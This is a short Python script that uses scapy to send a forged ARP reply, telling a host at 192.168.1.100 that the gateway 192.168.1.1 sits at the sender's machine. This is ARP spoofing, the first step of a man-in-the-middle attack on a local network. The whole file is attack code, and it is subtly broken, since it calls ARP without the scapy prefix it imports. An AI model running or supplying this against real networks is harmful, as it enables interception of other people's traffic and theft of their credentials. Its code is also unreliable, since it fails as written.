import scapy.all as scapy

def arp_spoof(ip, mac, gateway_ip):
    packet = ARP(op=2, pdst=ip, hwdst=mac, psrc=gateway_ip)
    scapy.send(packet, verbose=0)

ip = "192.168.1.100"
mac = "00:11:22:33:44:55"
gateway_ip = "192.168.1.1"
arp_spoof(ip, mac, gateway_ip)